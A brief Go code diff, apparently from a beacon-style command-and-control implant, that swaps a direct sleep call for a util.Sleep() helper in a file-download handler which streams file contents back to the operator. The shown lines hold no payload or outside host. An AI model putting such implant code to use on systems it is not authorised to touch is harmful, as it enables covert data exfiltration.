@@ -10,7 +10,6 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
-	"time"
 )
 
 var fileCounter = 0
@@ -178,7 +177,7 @@ func Download(b []byte) error {
 			result = util.BytesCombine(requestIDBytes, fileContent)
 			packet.PushResult(packet.CALLBACK_FILE_WRITE, result)
 			// sleep the same time as beacon
-			time.Sleep(time.Millisecond * time.Duration(config.WaitTime))
+			util.Sleep()
 		}
 
 		packet.PushResult(packet.CALLBACK_FILE_CLOSE, requestIDBytes)
